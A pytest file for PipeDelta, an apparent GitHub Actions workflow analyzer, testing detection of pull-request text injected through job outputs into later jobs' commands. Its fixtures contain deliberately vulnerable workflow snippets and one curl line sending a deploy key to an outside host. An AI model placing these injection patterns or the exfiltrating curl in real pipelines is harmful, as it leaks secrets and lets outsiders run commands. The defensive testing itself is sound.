"""Stage 2: values passed from one job to another through job outputs.

What GitHub does (docs: "Passing information between jobs", "needs context"):

* a job can publish named outputs under ``jobs.<job>.outputs``;
* another job reads one as ``needs.<job>.outputs.<name>``, and only if it
  lists that job under ``needs``;
* an output whose value contains a secret is withheld by the runner.

What PipeDelta follows: outsider-controlled text that one job publishes as an
output and a job that needs it pastes into a command. Nothing else.

What these tests insist on NOT being assumed:

* ``needs`` alone passes no data;
* jobs that are not linked by ``needs`` are not connected;
* a secret written directly into an output is withheld by GitHub;
* an output whose content cannot be worked out from the file is not accused.
"""

from pipedelta.delta import compare, overall
from pipedelta.paths import paths_in
from pipedelta.powers import extract_powers

TOP = "on: pull_request\npermissions:\n  contents: read\njobs:\n"

# Job "a" publishes the pull request title as an output, written directly.
A_DIRECT = (
    "  a:\n    runs-on: ubuntu-latest\n"
    "    outputs:\n      title: ${{ github.event.pull_request.title }}\n"
    "    steps:\n      - run: make\n"
)
# The usual careful-looking way: the title goes through an environment
# variable, and the step writes it to the output file.
A_VIA_STEP = (
    "  a:\n    runs-on: ubuntu-latest\n"
    "    outputs:\n      title: ${{ steps.read.outputs.title }}\n"
    "    steps:\n"
    "      - id: read\n"
    "        env:\n          TITLE: ${{ github.event.pull_request.title }}\n"
    '        run: echo "title=$TITLE" >> "$GITHUB_OUTPUT"\n'
)
# An output that an outsider cannot fill.
A_PLAIN = (
    "  a:\n    runs-on: ubuntu-latest\n"
    "    outputs:\n      title: ${{ steps.read.outputs.title }}\n"
    "    steps:\n"
    "      - id: read\n"
    '        run: echo "title=$GITHUB_SHA" >> "$GITHUB_OUTPUT"\n'
)


def b(run: str, needs: str = "    needs: a\n", extra: str = "") -> str:
    return (
        "  b:\n    runs-on: ubuntu-latest\n"
        + needs
        + extra
        + "    steps:\n      - run: "
        + run
        + "\n"
    )


PASTE = 'echo "${{ needs.a.outputs.title }}"'


def injected(text: str) -> set[str]:
    """Jobs in which outsider text reaches a command."""
    return {p.where for p in extract_powers(text) if p.kind == "injection"}


# ---- attack workflows -------------------------------------------------------


def test_output_written_directly_from_outsider_text_reaches_a_command_in_the_next_job():
    assert injected(TOP + A_DIRECT + b(PASTE)) == {"b"}


def test_output_set_by_a_step_that_reads_outsider_text_reaches_the_next_job():
    assert injected(TOP + A_VIA_STEP + b(PASTE)) == {"b"}


def test_step_that_pastes_outsider_text_into_its_own_command_and_sets_an_output():
    a = (
        "  a:\n    runs-on: ubuntu-latest\n"
        "    outputs:\n      title: ${{ steps.read.outputs.title }}\n"
        "    steps:\n      - id: read\n"
        '        run: echo "title=${{ github.event.pull_request.title }}" >> "$GITHUB_OUTPUT"\n'
    )
    assert injected(TOP + a + b(PASTE)) == {"a", "b"}


def test_value_passed_on_through_a_middle_job():
    middle = (
        "  m:\n    runs-on: ubuntu-latest\n    needs: a\n"
        "    outputs:\n      again: ${{ needs.a.outputs.title }}\n"
        "    steps:\n      - run: make\n"
    )
    last = b('echo "${{ needs.m.outputs.again }}"', needs="    needs: [m]\n")
    assert injected(TOP + A_DIRECT + middle + last) == {"b"}


def test_all_outputs_at_once():
    assert injected(TOP + A_DIRECT + b("echo '${{ toJSON(needs.a.outputs) }}'")) == {"b"}


def test_other_spellings_of_the_same_reference():
    assert injected(TOP + A_DIRECT + b("echo \"${{ needs['a'].outputs['title'] }}\"")) == {"b"}
    assert injected(TOP + A_DIRECT + b('echo "${{ NEEDS.A.Outputs.TITLE }}"')) == {"b"}


def test_script_of_a_github_script_step():
    job = (
        "  b:\n    runs-on: ubuntu-latest\n    needs: a\n    steps:\n"
        "      - uses: actions/github-script@v7\n"
        "        with:\n          script: console.log('${{ needs.a.outputs.title }}')\n"
    )
    assert injected(TOP + A_DIRECT + job) == {"b"}


def test_a_change_in_one_job_creates_a_risk_in_another_that_was_not_edited():
    """Job b is identical before and after. Only job a changed, and b holds a secret."""
    secret = "    env:\n      K: ${{ secrets.DEPLOY_KEY }}\n"
    old = TOP + A_PLAIN + b(PASTE, extra=secret)
    new = TOP + A_VIA_STEP + b(PASTE, extra=secret)
    findings = compare(old, new)
    assert overall(findings) == "high"
    raised = [f for f in findings if f.power.kind == "injection"]
    assert [f.power.where for f in raised] == ["b"]
    assert "another job" in raised[0].message
    assert "outsider commands can read a secret" in {p.rule for p in paths_in(new)}
    assert paths_in(old) == []


# ---- safe workflows ---------------------------------------------------------


def test_needs_alone_passes_nothing():
    """b waits for a but reads none of its outputs."""
    text = TOP + A_DIRECT + b("make test", extra="    env:\n      K: ${{ secrets.DEPLOY_KEY }}\n")
    assert injected(text) == set()
    assert paths_in(text) == []


def test_jobs_not_linked_by_needs_are_not_connected():
    """Without ``needs`` GitHub gives b an empty value."""
    assert injected(TOP + A_DIRECT + b(PASTE, needs="")) == set()


def test_only_a_direct_dependency_counts():
    """c needs m, m needs a. c cannot read a's outputs."""
    middle = "  m:\n    runs-on: ubuntu-latest\n    needs: a\n    steps:\n      - run: make\n"
    last = (
        "  c:\n    runs-on: ubuntu-latest\n    needs: m\n    steps:\n      - run: " + PASTE + "\n"
    )
    assert injected(TOP + A_DIRECT + middle + last) == set()


def test_an_output_the_job_does_not_define_is_empty():
    assert injected(TOP + A_DIRECT + b('echo "${{ needs.a.outputs.other }}"')) == set()


def test_an_output_an_outsider_cannot_fill_is_not_reported():
    assert injected(TOP + A_PLAIN + b(PASTE)) == set()


def test_reading_the_output_through_an_environment_variable_is_the_safe_way():
    job = (
        "  b:\n    runs-on: ubuntu-latest\n    needs: a\n    steps:\n"
        "      - env:\n          TITLE: ${{ needs.a.outputs.title }}\n"
        '        run: echo "$TITLE"\n'
    )
    assert injected(TOP + A_DIRECT + job) == set()


def test_an_output_that_is_only_compared_cannot_carry_text():
    assert injected(TOP + A_DIRECT + b("echo ${{ needs.a.outputs.title == 'release' }}")) == set()
    job = b("make", extra="    if: needs.a.outputs.title != ''\n")
    assert injected(TOP + A_DIRECT + job) == set()


def test_an_output_made_by_an_outside_action_is_unknown_and_not_accused():
    """What an action puts in its outputs cannot be read from the workflow file."""
    a = (
        "  a:\n    runs-on: ubuntu-latest\n"
        "    outputs:\n      title: ${{ steps.read.outputs.result }}\n"
        "    steps:\n      - id: read\n        uses: someone/reader@v1\n"
        "        with:\n          text: ${{ github.event.pull_request.title }}\n"
    )
    assert injected(TOP + a + b(PASTE)) == set()


def test_a_secret_written_into_an_output_is_not_treated_as_arriving_in_the_next_job():
    """GitHub withholds an output that contains a secret, so b is not said to hold it."""
    a = (
        "  a:\n    runs-on: ubuntu-latest\n"
        "    outputs:\n      key: ${{ secrets.DEPLOY_KEY }}\n"
        "    steps:\n      - run: make\n"
    )
    text = TOP + a + b("curl https://stats.example.org/?k=${{ needs.a.outputs.key }}")
    held_by_b = {p.name for p in extract_powers(text) if p.kind == "secret" and p.where == "b"}
    assert held_by_b == set()
    assert injected(text) == set()
    assert paths_in(text) == []


# ---- renames, reorders, damaged files ---------------------------------------


def test_renaming_the_job_that_publishes_the_output_reports_nothing_new():
    old = TOP + A_DIRECT + b(PASTE)
    new = old.replace("  a:\n", "  source:\n").replace("needs: a", "needs: source")
    new = new.replace("needs.a.", "needs.source.")
    assert injected(new) == {"b"}
    assert [f for f in compare(old, new) if f.level != "low"] == []


def test_reordering_linked_jobs_reports_nothing():
    assert compare(TOP + A_DIRECT + b(PASTE), TOP + b(PASTE) + A_DIRECT) == []


def test_an_existing_link_is_not_reported_again_after_an_unrelated_edit():
    old = TOP + A_DIRECT + b(PASTE)
    new = old.replace("- run: make\n", "- run: make all\n")
    assert compare(old, new) == []


def test_jobs_that_need_each_other_do_not_hang():
    text = (
        TOP
        + "  a:\n    runs-on: ubuntu-latest\n    needs: b\n"
        + "    outputs:\n      x: ${{ needs.b.outputs.y }}\n    steps:\n      - run: make\n"
        + "  b:\n    runs-on: ubuntu-latest\n    needs: a\n"
        + "    outputs:\n      y: ${{ needs.a.outputs.x }}\n"
        + '    steps:\n      - run: echo "${{ needs.a.outputs.x }}"\n'
    )
    assert injected(text) == set()


def test_damaged_needs_and_outputs_do_not_crash():
    for needs, outputs in [("5", "7"), ("{x: 1}", "[a, b]"), ("[1, null]", "{title: 3}"), ("", "")]:
        text = (
            TOP
            + f"  a:\n    runs-on: ubuntu-latest\n    outputs: {outputs}\n    steps:\n      - run: make\n"
            + f"  b:\n    runs-on: ubuntu-latest\n    needs: {needs}\n    steps:\n      - run: "
            + PASTE
            + "\n"
        )
        assert injected(text) == set()
